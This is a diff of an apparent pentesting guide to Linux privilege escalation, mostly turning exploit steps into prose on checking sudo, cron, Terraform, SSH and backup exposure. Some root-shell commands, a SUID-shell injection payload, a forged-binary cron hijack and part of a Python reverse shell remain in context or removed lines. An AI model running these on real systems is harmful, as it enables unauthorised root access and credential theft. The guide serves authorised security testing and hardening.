@@ -36,6 +36,8 @@ Interesting information, passwords or API keys in the environment variables?
 
 Check the kernel version and if there is some exploit that can be used to escalate privileges
 
+The [Kernel/LPE/CVE section](../../main-system-information/kernel-lpe-cves/README.md) collects local escalation cases and links to the deeper Linux kernel write-ups in Binary Exploitation. Verify the affected build and configuration before testing a case study.
+
 ```bash
 cat /proc/version
 uname -a
@@ -96,7 +98,7 @@ sudo -V | grep "Sudo ver" | grep "1\.[01234567]\.[0-9]\+\|1\.8\.1[0-9]\*\|1\.8\.
 
 ### Sudo < 1.9.17p1
 
-Sudo versions before 1.9.17p1 (**1.9.14 - 1.9.17 < 1.9.17p1**) allows unprivileged local users to escalate their privileges to root via sudo `--chroot` option when `/etc/nsswitch.conf` file is used from a user controlled directory.<sup>[[28]](#references)[[29]](#references)</sup>  
+Upstream sudo **1.9.14 through 1.9.17** allows unprivileged local users to escalate to root via the `--chroot` option when sudo loads `/etc/nsswitch.conf` from a user-controlled directory; upstream fixed this in **1.9.17p1**. Check every executable root-setuid sudo binary in the relevant paths, since `sudo -V` reports only the binary selected by `PATH`. Distribution packages may backport the fix without changing the upstream version string, so verify the vendor package status too. See the [sudo maintainer's advisory](https://www.openwall.com/lists/oss-security/2025/06/30/3).<sup>[[28]](#references)[[29]](#references)</sup>
 
 Here is a [PoC](https://github.com/pr0v3rbs/CVE-2025-32463_chwoot) to exploit that [vulnerability](https://nvd.nist.gov/vuln/detail/CVE-2025-32463). Before running the exploit, make sure that your `sudo` version is vulnerable and that it supports the `chroot` feature.  
 
@@ -104,7 +106,7 @@ For more information, refer to the original [vulnerability advisory](https://www
 
 ### Sudo host-based rules bypass (CVE-2025-32462)
 
-Sudo before 1.9.17p1 (reported affected range: **1.8.8–1.9.17**) can evaluate host-based sudoers rules using the **user-supplied hostname** from `sudo -h <host>` instead of the **real hostname**. If sudoers grants broader privileges on another host, you can **spoof** that host locally.<sup>[[29]](#references)</sup>
+Upstream sudo **1.8.8 through 1.9.17** can evaluate host-based sudoers rules using the **user-supplied hostname** from `sudo -h <host>` instead of the **real hostname**; upstream fixed this in **1.9.17p1**. The user must still have a matching sudoers entry on the selected host. Review vendor backports and alternate sudo binaries as well as the local policy. See the [sudo maintainer's advisory](https://www.openwall.com/lists/oss-security/2025/06/30/2).<sup>[[29]](#references)</sup>
 
 Requirements:
 - Vulnerable sudo version
@@ -125,11 +127,11 @@ sudo -h devbox id
 sudo -h devbox -i
 ```
 
-If resolution of the spoofed name blocks, add it to `/etc/hosts` or use a hostname that already appears in logs/configs to avoid DNS lookups.
+If resolution of the selected name blocks, verify how that name resolves on the host. Merely seeing a name in a log or configuration file does not make it resolvable, and changing `/etc/hosts` normally requires privileged write access.
 
 #### sudo < v1.8.28
 
-From @sickrov
+This [upstream Runas UID bypass](https://ubuntu.com/security/CVE-2019-14287) requires an effective sudo rule that permits a command as `ALL` users while excluding root, such as `(ALL, !root) /bin/bash`. The caller must also be allowed to use that rule, including any authentication requirement. Check the installed package advisory: vendors backported the fix into releases whose displayed upstream version is still below 1.8.28. A `!root` rule or an old version alone does not confirm exposure. Do not test a privileged command during passive enumeration.
 
 ```
 sudo -u#-1 /bin/bash
@@ -311,6 +313,10 @@ This is especially valuable when a process still has a deleted secret, script, d
 
 You can use tools like [**pspy**](https://github.com/DominicBreuker/pspy) to monitor processes. This can be very useful to identify vulnerable processes being executed frequently or when a set of requirements are met.
 
+#### Linux ProcMon under sudo
+
+[ProcMon for Linux](https://github.com/microsoft/ProcMon-for-Linux) can trace selected processes and system calls and save a SQLite trace. If `sudo -l` allows an unrestricted root-capable `procmon` command, consider whether it could observe another user's process input or output. The permission is only a review lead: tracer support, effective policy, and the activity of a suitable process all matter. Trace files can contain secrets, so inspect authorized exports carefully and avoid collecting unrelated processes.
+
 ### Process memory
 
 Some services of a server save **credentials in clear text inside the memory**.\
@@ -326,6 +332,8 @@ However, remember that **as a regular user you can read the memory of the proces
 > - **kernel.yama.ptrace_scope = 1**: only a parent process can be debugged.
 > - **kernel.yama.ptrace_scope = 2**: Only admin can use ptrace, as it required CAP_SYS_PTRACE capability.
 > - **kernel.yama.ptrace_scope = 3**: No processes may be traced with ptrace. Once set, a reboot is needed to enable ptracing again.
+
+A same-UID process that briefly unlocks a password vault can be a separate credential boundary. When tracing is permitted, an active, dumpable process may expose the vault password through its input syscalls or memory, even though the encrypted vault file itself remains protected. `ptrace_scope=0` is only one prerequisite: matching credentials, target dumpability, other Linux security modules, and the process lifetime also matter. A vault entry becoming a Unix root login requires a separate credential-reuse check. Routine enumeration should report the policy and candidate process or vault paths, not capture input or print secrets. See the [kernel's Yama documentation](https://cdn.kernel.org/doc/html/latest/admin-guide/LSM/Yama.html) and [ptrace access checks](https://man7.org/linux/man-pages/man2/ptrace.2.html).
 
 #### GDB
 
@@ -550,9 +558,9 @@ Read the following page for more wildcard exploitation tricks:
 
 ### Bash arithmetic expansion injection in cron log parsers
 
-Bash performs parameter expansion and command substitution before arithmetic evaluation in ((...)), $((...)) and let. If a root cron/parser reads untrusted log fields and feeds them into an arithmetic context, an attacker can inject a command substitution $(...) that executes as root when the cron runs.<sup>[[22]](#references)</sup>
+Bash arithmetic can interpret untrusted text as an expression. In affected Bash contexts, an array subscript inside that expression can evaluate a command substitution. If a privileged cron/parser places attacker-controlled log text into such an arithmetic comparison, the substitution can run with the parser's identity.<sup>[[22]](#references)</sup> This depends on the exact Bash expression and version; a bare `$(...)0` string in an expanded variable is not, by itself, a reliable demonstration of re-evaluation.
 
-- Why it works: In Bash, expansions occur in this order: parameter/variable expansion, command substitution, arithmetic expansion, then word splitting and pathname expansion. So a value like `$(/bin/bash -c 'id > /tmp/pwn')0` is first substituted (running the command), then the remaining numeric `0` is used for the arithmetic so the script continues without errors.
+The input can also come from file metadata or another field read from a user-writable location. For example, a privileged cleanup script that reads an image `Producer` tag and compares it with `[[ "$producer" -eq "expected" ]]` performs an arithmetic comparison, even though the variable is quoted. Trace the scheduled identity, which files can supply the tag, any transformations before the comparison, and the exact Bash behavior. For text labels, use a string comparison; for numbers, validate the input as decimal digits before arithmetic. See the [Bash arithmetic rules](https://www.gnu.org/software/bash/manual/html_node/Shell-Arithmetic.html).
 
 - Typical vulnerable pattern:
   ```bash
@@ -564,12 +572,14 @@ Bash performs parameter expansion and command substitution before arithmetic eva
   done < /var/www/app/log/application.log
   ```
 
-- Exploitation: Get attacker-controlled text written into the parsed log so that the numeric-looking field contains a command substitution and ends with a digit. Ensure your command does not print to stdout (or redirect it) so the arithmetic remains valid.
+- Safe local behavior probe for the array-subscript mechanism (no privileged process or file change):
   ```bash
-  # Injected field value inside the log (e.g., via a crafted HTTP request that the app logs verbatim):
-  $(/bin/bash -c 'cp /bin/bash /tmp/sh; chmod +s /tmp/sh')0
-  # When the root cron parser evaluates (( total += count )), your command runs as root.
+  code='x[$(printf marker >&2)]'
+  [[ 200 -eq "$code" ]]
+  # Bash may print "marker" while evaluating the arithmetic operand.
   ```
+
+Trace the actual scheduled script and the literal input path it opens. Even when the log file itself is not writable, a user who can write and traverse its non-sticky parent may be able to replace its directory entry; `namei -l` helps distinguish those permissions. A different writable log path, an unreadable scheduler, or a parser that never evaluates that field as Bash arithmetic does not establish this path.
 
 ### Cron script overwriting and symlink
 
@@ -607,26 +617,9 @@ For defenders/developers, safer patterns against symlink tricks include:
 - `mkstemp()`: create temporary files atomically with secure permissions.
 
 ### Custom-signed cron binaries with writable payloads
-Blue teams sometimes "sign" cron-driven binaries by dumping a custom ELF section and grepping for a vendor string before executing them as root. If that binary is group-writable (e.g., `/opt/AV/periodic-checks/monitor` owned by `root:devs 770`) and you can leak the signing material, you can forge the section and hijack the cron task:<sup>[[2]](#references)</sup>
+An ordinary user who can write the exact binary run by a root cron job may cross a privilege boundary, but a custom signature check can reject an unsigned replacement. In the documented case, the root-owned ELF was mode `0760`, allowing a member of its group to write it while the root owner could execute it. A visible process trace showed `objcopy` extracting `.text_sig` before the job ran the binary; the complete verifier script was not readable.<sup>[[2]](#references)</sup>
 
-1. Use `pspy` to capture the verification flow. In Era, root ran `objcopy --dump-section .text_sig=text_sig_section.bin monitor` followed by `grep -oP '(?<=UTF8STRING        :)Era Inc.' text_sig_section.bin` and then executed the file.
-2. Recreate the expected certificate using the leaked key/config (from `signing.zip`):
-   ```bash
-   openssl req -x509 -new -nodes -key key.pem -config x509.genkey -days 365 -out cert.pem
-   ```
-3. Build a malicious replacement (e.g., drop a SUID bash, add your SSH key) and embed the certificate into `.text_sig` so the grep passes:
-   ```bash
-   gcc -fPIC -pie monitor.c -o monitor
-   objcopy --add-section .text_sig=cert.pem monitor
-   objcopy --dump-section .text_sig=text_sig_section.bin monitor
-   strings text_sig_section.bin | grep 'Era Inc.'
-   ```
-4. Overwrite the scheduled binary while preserving execute bits:
-   ```bash
-   cp monitor /opt/AV/periodic-checks/monitor
-   chmod 770 /opt/AV/periodic-checks/monitor
-   ```
-5. Wait for the next cron run; once the naive signature check succeeds, your payload runs as root.
+The replacement that succeeded was signed with leaked private signing material using an ELF signer. Its [format documentation](https://github.com/NUAA-WatchDog/linux-elf-binary-signer) describes a signature section derived from the executable's `.text`. Merely adding a certificate or a matching string to `.text_sig` is not shown to satisfy the unseen verifier. Check the actual scheduled path, effective write access, root invocation and verifier policy before concluding that a writable signed binary is exploitable. A `.text_sig` section by itself is only a review clue.
 
 ### Frequent cron jobs
 
@@ -1025,6 +1018,8 @@ sudo conntrack -L 2>/dev/null | head -n 20
 lsof -i
 ```
 
+If an active `/etc/inetd.conf` entry runs GNU Inetutils `telnetd` as root, check the configured binary version and the local listener even when the port is bound only to loopback. GNU Inetutils 1.9.3 through 2.7 had a [telnet authentication bypass](https://seclists.org/oss-sec/2026/q1/89) in which client-supplied `USER` reached `login -f` (CVE-2026-24061). A process or version string is an indicator; confirm vendor patch status and the actual daemon before treating it as exposed. The [Telnet guide](../../../network-services-pentesting/pentesting-telnet.md) has more detail.
+
 ### Outbound filtering quick triage
 
 If the host can run commands but callbacks fail, separate DNS, transport, proxy, and route filtering quickly:
@@ -1256,6 +1251,14 @@ In this example the user `demo` can run `vim` as `root`, it is now trivial to ge
 sudo vim -c '!sh'
 ```
 
+### Unquoted Bash comparison in a sudo script
+
+In Bash, the right side of `[[ "$protected" == $candidate ]]` is a pattern. If a root-capable sudo script fills `candidate` from a caller-controlled file, a value such as `prefix*` can match the start of a protected string. Different success and error paths may then expose a prefix oracle. Quote the right side (`[[ "$protected" == "$candidate" ]]`) when literal equality is intended. Review the actual sudo arguments, input provenance, and observable branch behavior before treating an unquoted comparison as exploitable. The [GNU Bash manual](https://www.gnu.org/software/bash/manual/html_node/Conditional-Constructs.html) defines this pattern behavior.
+
+### PrusaSlicer project files under sudo
+
+An unrestricted root-capable sudo grant for `prusaslicer` or `prusa-slicer` deserves review if the caller can choose the `.3mf` project being sliced. A project can carry a post-processing script that runs when G-code is exported; crafted projects could execute commands in PrusaSlicer through 2.6.1 ([CVE-2023-47268](https://security-tracker.debian.org/tracker/CVE-2023-47268)). Confirm the effective sudo rule, binary version and vendor patches, project source, and whether the relevant export path runs before concluding that the privilege boundary is reachable. A fixed project argument or effective `NOEXEC` policy can change the outcome. Merely finding the slicer installed does not establish a privilege escalation path.
+
 ### SETENV
 
 This directive allows the user to **set an environment variable** while executing something:
@@ -1316,7 +1319,7 @@ Important notes:
 
 - Reusing the original header is key because Python checks the cache metadata against the source file, not whether the bytecode body really matches the source.
 - This is especially useful when the source file is root-owned and not writable, but the containing `__pycache__` directory is.
-- The attack fails if the privileged process uses `PYTHONDONTWRITEBYTECODE=1`, imports from a location with safe permissions, or removes write access to every directory in the import path.
+- `PYTHONDONTWRITEBYTECODE=1` and `python -B` stop Python from writing new `.pyc` files; they do **not** stop it from loading an already valid, attacker-replaced cache. The critical boundary is whether a lower-privileged user can replace a cache that the privileged import will accept. Python checks timestamp/size or hash metadata before loading cached bytecode. See the [Python import reference](https://docs.python.org/3.12/reference/import.html#cached-bytecode-invalidation) and [command-line documentation](https://docs.python.org/3.12/using/cmdline.html#envvar-PYTHONDONTWRITEBYTECODE).
 
 Minimal proof-of-concept shape:
 
@@ -1340,7 +1343,7 @@ subprocess.run(["sudo", "/opt/app/runner.py"])
 Hardening:
 
 - Ensure no directory in the privileged Python import path is writable by low-privileged users, including `__pycache__`.
-- For privileged runs, consider `PYTHONDONTWRITEBYTECODE=1` and periodic checks for unexpected writable `__pycache__` directories.
+- Audit cache-directory ownership and permissions, including existing `.pyc` files. Disabling bytecode writes can reduce new cache creation, but does not neutralize a replaceable existing cache.
 - Treat writable local Python modules and writable cache directories the same way you would treat writable shell scripts or shared libraries executed by root.
 
 ### BASH_ENV preserved via sudo env_keep → root shell
@@ -1372,7 +1375,7 @@ BASH_ENV=/dev/shm/shell.sh sudo /usr/bin/systeminfo   # or any permitted script/
 
 ### Terraform via sudo with preserved HOME (!env_reset)
 
-If sudo leaves the environment intact (`!env_reset`) while allowing `terraform apply`, `$HOME` stays as the calling user. Terraform therefore loads **$HOME/.terraformrc** as root and honors `provider_installation.dev_overrides`.<sup>[[25]](#references)</sup>
+When sudo allows Terraform as a more privileged user, `!env_reset` is a clue to check which environment variables actually survive that specific rule. Confirm the effective `HOME` or `TF_CLI_CONFIG_FILE` before treating a caller-writable `.terraformrc` or `terraform.rc` as the active CLI configuration. A `provider_installation.dev_overrides` entry matters only if the fixed Terraform command loads that provider and the caller can place its executable in the selected directory.<sup>[[25]](#references)</sup>
 
 - Point the required provider at a writable directory and drop a malicious plugin named after the provider (e.g., `terraform-provider-examples`):
 
@@ -1401,7 +1404,7 @@ Terraform will fail the Go plugin handshake but executes the payload as root bef
 
 ### TF_VAR overrides + symlink validation bypass
 
-Terraform variables can be provided via `TF_VAR_<name>` environment variables, which survive when sudo preserves the environment. Weak validations such as `strcontains(var.source_path, "/root/examples/") && !strcontains(var.source_path, "..")` can be bypassed with symlinks:<sup>[[25]](#references)</sup>
+Terraform variables can be provided via `TF_VAR_<name>` environment variables if the specific sudo rule preserves them. A source-symlink **read** also needs a provider that follows the link and copies the protected result to a caller-readable destination. A destination-symlink **write** separately needs a caller-controlled destination entry and a privileged provider that follows it on write; a later scheduled job is only one possible consequence. Inspect the exact sudo grant, relevant `.tf` files, selected CLI config, and path ownership with read-only commands such as `sudo -l`, `stat`, and `readlink` before testing either route. Weak lexical validations such as `strcontains(var.source_path, "/root/examples/") && !strcontains(var.source_path, "..")` do not resolve symlinks:<sup>[[25]](#references)</sup>
 
 ```bash
 mkdir -p /dev/shm/root/examples
@@ -1424,7 +1427,7 @@ This is not a direct vulnerability by itself, but it expands the situations wher
 
 ### Sudo env_keep+=PATH / insecure secure_path → PATH hijack
 
-If `sudo -l` shows `env_keep+=PATH` or a `secure_path` containing attacker-writable entries (e.g., `/home/<user>/bin`), any relative command inside the sudo-allowed target can be shadowed.<sup>[[3]](#references)</sup>
+If `sudo -l` shows `env_keep+=PATH` or a `secure_path` containing attacker-writable entries (e.g., `/home/<user>/bin`), an unqualified external command inside the sudo-allowed target may be shadowed.<sup>[[3]](#references)</sup> An absent effective `secure_path` also merits review **if** the command's sudo environment preserves a caller-controlled `PATH`; absence alone does not prove that it does. Read the permitted script without running it, then verify the exact RunAs and argument rule, the effective command search path, and an earlier writable and traversable directory containing the command name. Authentication, `NOEXEC`, shell builtins, and absolute command paths can change the outcome.
 
 - Requirements: a sudo rule (often `NOPASSWD`) running a script/binary that calls commands without absolute paths (`free`, `df`, `ps`, etc.) and a writable PATH entry that is searched first.
 
@@ -1486,6 +1489,10 @@ export -f /usr/sbin/service
 ```
 
 Then, when you call the suid binary, this function will be executed
+
+### Custom SUID copy wrappers
+
+A root-owned SUID utility that accepts source and destination paths can cross two different trust boundaries. If it builds a shell command from either argument (for example, passing a constructed `cp` command to `system()`), shell metacharacters may execute another command with its effective privileges. Even if it invokes `cp` safely without a shell, an unrestricted destination can permit an arbitrary privileged write to files such as `/etc/passwd`. Review the wrapper's argument handling, effective UID behavior, destination restrictions, and whether the copied file keeps caller-controlled contents; a generic `cp` error or SUID bit alone is not proof of either path. Enumerate the binary and permissions passively before any manual testing.
 
 ### Writable script executed by a SUID wrapper
 
@@ -1765,6 +1772,8 @@ doas vim
 :!/bin/sh
 ```
 
+A root-capable `doas` rule for the original Python-based `dstat` also merits a plugin-path review. Its [manual](https://github.com/dstat-real/dstat/blob/master/docs/dstat.1) and [source](https://github.com/dstat-real/dstat/blob/master/dstat) list `/usr/share/dstat/` and `/usr/local/share/dstat/` among locations for `dstat_*.py` plugins. If the current user can write and search a location actually used by the installed build, a selected plugin may run with the `doas` RunAs identity. Confirm the effective rule, plugin lookup in that build, directory and parent permissions or ACLs, and whether the caller can select a plugin; a `dstat` rule or writable directory alone is only a lead. Other `dstat` implementations can use different plugin systems. Inspect metadata passively without loading a plugin.
+
 ### Sudo Hijacking
 
 If you know that a **user usually connects to a machine and uses `sudo`** to escalate privileges and you got a shell within that user context, you can **create a new sudo executable** that will execute your code as root and then the user's command. Then, **modify the $PATH** of the user context (for example adding the new path in .bash_profile) so when the user executes sudo, your sudo executable is executed.
@@ -1898,8 +1907,7 @@ This is a high-impact ACL persistence/privesc path because it is easy to miss in
 
 ## Open shell sessions
 
-In **old versions** you may **hijack** some **shell** session of a different user (**root**).\
-In **newest versions** you will be able to **connect** to screen sessions only of **your own user**. However, you could find **interesting information inside the session**.
+Cross-user GNU Screen access depends on the **running session's configuration and ACL**, not its version alone. [GNU Screen documents](https://www.gnu.org/software/screen/manual/html_node/Multiuser-Session.html) that it must be built with multiuser support; `multiuser on` and an `acladd` or suitable `aclchg` grant allow another user to attach. [The manual also requires setuid-root](https://www.gnu.org/software/screen/manual/html_node/Invoking-Screen.html) for the cross-user session lookup. A visible root-owned socket or a SUID `screen` binary alone does not establish an attachable root shell. Confirm the live session is multiuser, the current user has effective input/command permission, and the shell in that session runs as the privileged owner before treating it as escalation.
 
 ### screen sessions hijacking
 
@@ -1955,12 +1963,11 @@ Check **Valentine box from HTB** for an example.
 
 ### Debian OpenSSL Predictable PRNG - CVE-2008-0166
 
-All SSL and SSH keys generated on Debian based systems (Ubuntu, Kubuntu, etc) between September 2006 and May 13th, 2008 may be affected by this bug.\
-This bug is caused when creating a new ssh key in those OS, as **only 32,768 variations were possible**. This means that all the possibilities can be calculated and **having the ssh public key you can search for the corresponding private key**. You can find the calculated possibilities here: [https://github.com/g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh)
+Keys generated with affected Debian or derivative OpenSSL builds during the historical vulnerable period may have predictable randomness; the host's current distribution or patched OpenSSL version does not establish how an older key was generated. Check the **specific key** against a suitable historical blacklist and its provenance. Debian's [`ssh-vulnkey` manual](https://manpages.debian.org/wheezy/openssh-client/ssh-vulnkey.1.en.html) describes checking public keys and `authorized_keys`, and [DSA-1571-1](https://security-tracker.debian.org/tracker/DSA-1571-1) records the OpenSSL fix. An entry in a privileged account's `authorized_keys` is an escalation lead only if its matching private key is recoverable and the effective SSH policy still accepts that key for that account; a weak **host** key is not itself a login credential. Replace compromised keys and remove their old authorizations.
 
 ### SSH Interesting configuration values
 
-- **PasswordAuthentication:** Specifies whether password authentication is allowed. The default is `no`.
+- **PasswordAuthentication:** Specifies whether password authentication is allowed. The upstream OpenSSH default is `yes`; distribution configuration can override it.
 - **PubkeyAuthentication:** Specifies whether public key authentication is allowed. The default is `yes`.
 - **PermitEmptyPasswords**: When password authentication is allowed, it specifies whether the server allows login to accounts with empty password strings. The default is `no`.
 
@@ -1974,12 +1981,18 @@ These files influence who can log in and how:
 
 ### PermitRootLogin
 
-Specifies whether root can log in using ssh, default is `no`. Possible values:
+Specifies whether root can log in using ssh. The upstream OpenSSH default is `prohibit-password`; distribution configuration can override it. Possible values:
 
 - `yes`: root can login using password and private key
 - `without-password` or `prohibit-password`: root can only login with a private key
 - `forced-commands-only`: Root can login only using private key and if the commands options are specified
 - `no` : no
+
+### Trusted SSH user certificate authorities
+
+`TrustedUserCAKeys` names public keys that sshd trusts to sign **user** certificates. If the corresponding private CA key is readable by a lower-privileged user, review who may obtain a certificate and which account principals it could authenticate as. `AuthorizedPrincipalsFile` or `AuthorizedPrincipalsCommand` can restrict accepted names; when neither is configured, the certificate must contain the target account name. `PermitRootLogin prohibit-password` blocks root password authentication but can still permit certificate authentication. An exposed key path alone does not prove access: confirm the public/private key pair, effective `Match` rules, account policy, key passphrase, revocation, and accepted signature algorithms. Do not include private-key bytes in enumeration output. See the [OpenSSH server configuration manual](https://man.openbsd.org/sshd_config#TrustedUserCAKeys).
+
+A private CA key can also be usable **without being readable** to the current user if a privilege-delegation rule lets that user invoke an unrestricted [certificate signer such as `ssh-keygen -s`](https://man.openbsd.org/ssh-keygen#-s) under the key owner's identity. Correlate the exact allowed command and arguments with the signer account's access to the key, the public CA trusted by the effective sshd configuration, the principal accepted for the target account, certificate validity, and that account's login policy. A delegated signer command or a trusted CA file alone does not prove access to another account; do not sign a test certificate during passive enumeration.
 
 ### AuthorizedKeysFile
 
@@ -2129,11 +2142,15 @@ find / -type f -mmin -5 ! -path "/proc/*" ! -path "/sys/*" ! -path "/run/*" ! -p
 find / -name '*.db' -o -name '*.sqlite' -o -name '*.sqlite3' 2>/dev/null
 ```
 
+For readable application databases, inspect table and column names for usernames and password hashes. Finding a hash, recovering its password, and proving reuse for a local account are separate steps; a generic 32-character hexadecimal string is not enough to infer MD5 or account access.
+
 ### \*\_history, .sudo_as_admin_successful, profile, bashrc, httpd.conf, .plan, .htpasswd, .git-credentials, .rhosts, hosts.equiv, Dockerfile, docker-compose.yml files
 
 ```bash
 find / -type f \( -name "*_history" -o -name ".sudo_as_admin_successful" -o -name ".profile" -o -name "*bashrc" -o -name "httpd.conf" -o -name "*.plan" -o -name ".htpasswd" -o -name ".git-credentials" -o -name "*.rhosts" -o -name "hosts.equiv" -o -name "Dockerfile" -o -name "docker-compose.yml" \) 2>/dev/null
 ```
+
+If a readable shell history contains a `sudo` command followed by a short, password-like line, inspect the surrounding lines manually. A password entered into the normal `sudo` prompt is not saved in shell history; a following line is only a possible accidental shell input, not proof of a valid password. The `.sudo_as_admin_successful` marker records prior use, not current authorization.
 
 ### Hidden files
 
@@ -2159,6 +2176,14 @@ ls -alhR /opt/lampp/htdocs/ 2>/dev/null
 
 ### **Backups**
 
+Inspect readable files inside backup directories as well as files whose **names** contain `backup`: an archive with an opaque name or an encrypted extension can still expose old application data. An encrypted archive is only an exposure candidate. Password recovery, inspection of its contents, recovery of an application hash, and reuse of that password for a Unix account are separate steps to verify; a hash in an archive does not establish a local login.
+
+Readable virtual-machine backups deserve the same review. A VirtualBox `.vbox` configuration can identify attached `.vdi` images and carry encrypted disk-key metadata; [VirtualBox documents that the encrypted data key is stored in the VM configuration](https://docs.oracle.com/en/virtualization/virtualbox/7.0/user/AdvancedTopics.html). The configuration and image must both be accessible before an offline disk review is possible. A guest volume may have its own [LUKS encryption layer](https://gitlab.com/cryptsetup/cryptsetup/-/blob/main/man/cryptsetup.8.adoc), requiring a separate key. Even after authorized decryption, old scripts or configuration may contain a password; establish that the credential is current for a host account and that its effective `sudo` policy permits a privileged command before calling this a local escalation. Inventory paths and permissions without copying, decrypting, or mounting images during passive enumeration.
+
+When inspecting a readable archive, list member names before extracting anything: hidden authenticator files, recovery-code material, or SSH keys may be present even if the live copies are protected. File names only indicate a lead; verify the material and any account reuse separately.
+
+Prioritize **readable archives owned by another user** in backup directories, especially root-owned archives and those accessible through group membership. An old archive can contain a configuration or authentication secret even when the live copy is protected. For a local backup UI such as [Backrest](https://garethgeorge.github.io/backrest/), check the service's effective account and whether a lower-privilege user can read its configuration or authenticate to the UI. Its [hooks](https://garethgeorge.github.io/backrest/docs/hooks) and [restic command interface](https://github.com/garethgeorge/backrest/blob/main/proto/v1/service.proto) can operate with the daemon's file and command privileges; a loopback listener alone does not determine the impact. Backrest's `passwordBcrypt` is a base64-encoded bcrypt hash in its [authentication code](https://github.com/garethgeorge/backrest/blob/main/internal/auth/auth.go), not a plaintext password. Confirm service identity, usable credentials, and access to the relevant plan or repository before treating an exposed archive or UI as a privilege boundary.
+
 ```bash
 find /var /etc /bin /sbin /home /usr/local/bin /usr/local/sbin /usr/bin /usr/games /usr/sbin /root /tmp -type f \( -name "*backup*" -o -name "*\.bak" -o -name "*\.bck" -o -name "*\.bk" \) 2>/dev/null
 ```
@@ -2167,6 +2192,12 @@ find /var /etc /bin /sbin /home /usr/local/bin /usr/local/sbin /usr/bin /usr/gam
 
 Read the code of [**linPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS), it searches for **several possible files that could contain passwords**.\
 **Another interesting tool** that you can use to do so is: [**LaZagne**](https://github.com/AlessandroZ/LaZagne) which is an open source application used to retrieve lots of passwords stored on a local computer for Windows, Linux & Mac.
+
+If `/etc/guacamole/guacamole.properties` is readable, review its `mysql-*`, `postgresql-*`, or `sqlserver-*` database connection settings. Where the account is authorized to read the Guacamole JDBC tables, `guacamole_connection_parameter` may contain saved SSH `username`, `password`, `private-key`, or `passphrase` values. Start with connection IDs and parameter names, then inspect only relevant rows; a saved value may be a dynamic token or a vault reference rather than a reusable secret. See the [Guacamole JDBC schema](https://guacamole.apache.org/doc/gug/jdbc-auth-schema.html) and [SSH connection parameters](https://guacamole.apache.org/doc/gug/configuring-guacamole.html).
+
+The [pswm password manager](https://github.com/Julynx/pswm#usage) stores an encrypted vault at `~/.local/share/pswm/pswm` by default. If another user's vault is visible, check its ownership and whether your account can actually read it. The vault path alone does not reveal credentials; recovering its master password, finding a reusable account password, and confirming that account's privileges are separate steps.
+
+[Passpie's default database](https://passpie.readthedocs.io/en/latest/faq.html#what-is-a-passpie-database) is `~/.passpie/`, with a `.keys` keyring and encrypted `.pass` credential files under group directories. A visible database directory is a path lead only: confirm access to the key and relevant encrypted entry, any required master passphrase, and whether a recovered credential belongs to a more privileged account. Passpie also supports [custom database paths](https://passpie.readthedocs.io/en/latest/getting_started.html#multiple-databases), so the default path is not exhaustive. Automated enumeration should list metadata without exporting credentials or printing key material.
 
 ### Logs
 
@@ -2212,10 +2243,10 @@ import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s
 
 ### Logrotate exploitation
 
-A vulnerability in `logrotate` lets users with **write permissions** on a log file or its parent directories potentially gain escalated privileges. This is because `logrotate`, often running as **root**, can be manipulated to execute arbitrary files, especially in directories like _**/etc/bash_completion.d/**_. It's important to check permissions not just in _/var/log_ but also in any directory where log rotation is applied.
+A privileged `logrotate` job can create a cross-user file-write path when it actually rotates a log below a directory that a lower-privileged user can replace or redirect during rotation. A writable log alone is only a lead. Confirm the exact active rule and its `create`, `olddir`, and `su` directives; the scheduler's effective identity; write and search rights on the log's parent; and whether the installed build and policy allow the destination change. A later privileged shell must also load the resulting file for a startup-file write to become command execution. Inspect the schedule, rule, version/packaging, and path metadata without triggering a rotation or attempting the race.
 
 > [!TIP]
-> This vulnerability affects `logrotate` version `3.18.0` and older
+> Do not treat `3.18.0` or any version string alone as an exploitability cutoff. [Upstream's change log](https://github.com/logrotate/logrotate/blob/main/ChangeLog.md) records directory and symlink hardening in multiple releases, and distributions may backport fixes. The [upstream manual](https://github.com/logrotate/logrotate/blob/main/logrotate.8.in) recommends `su` when root rotates logs in directories controlled by non-privileged users; verify the effective rule and actual behavior.
 
 More detailed information about the vulnerability can be found on this page: [https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition).<sup>[[37]](#references)</sup>
 
@@ -2227,11 +2258,9 @@ This vulnerability is very similar to [**CVE-2016-1247**](https://www.cvedetails
 
 **Vulnerability reference:** [**https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f**](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f).<sup>[[20]](#references)</sup>
 
-If, for whatever reason, a user is able to **write** an `ifcf-<whatever>` script to _/etc/sysconfig/network-scripts_ **or** it can **adjust** an existing one, then your **system is pwned**.<sup>[[20]](#references)</sup>
+An `ifcfg-*` file is a review lead when a lower-privileged user can create or change it **and** a privileged network-activation path will read that exact file. Confirm the effective file and directory permissions, the selected interface, the installed `ifup`/`ifdown` implementation, and who invokes it. A writable file alone does not cause execution. [Red Hat's RHEL 7 networking guide](https://docs.redhat.com/en/documentation/red_hat_enterprise_linux/7/html/networking_guide/sec-using_networkmanager_with_sysconfig_files) distinguishes legacy network scripts from NetworkManager: the latter does not itself trigger the former. [RHEL 8 documents](https://docs.redhat.com/en/documentation/red_hat_enterprise_linux/8/html/configuring_and_managing_networking/assembly_legacy-network-scripts-support-in-rhel_configuring-and-managing-networking) that its default `ifup`/`ifdown` use NetworkManager, while the optional legacy package supplies shell scripts.
 
-Network scripts, _ifcg-eth0_ for example are used for network connections. They look exactly like .INI files. However, they are \~sourced\~ on Linux by Network Manager (dispatcher.d).
-
-In my case, the `NAME=` attributed in these network scripts is not handled correctly. If you have **white/blank space in the name the system tries to execute the part after the white/blank space**. This means that **everything after the first blank space is executed as root**.
+On a system actually using privileged legacy scripts, an unquoted, shell-sourced `ifcfg-*` assignment such as `NAME=` can cross a code-execution boundary. Verify the exact parser, value, and activation path; do not infer shell interpretation from the filename or NetworkManager's presence. A sudo-allowed wrapper that writes caller input into an `ifcfg-*` file and then calls legacy `ifup` is a separate route to this boundary even when the caller cannot directly edit the file.
 
 For example: _/etc/sysconfig/network-scripts/ifcfg-1337_
 
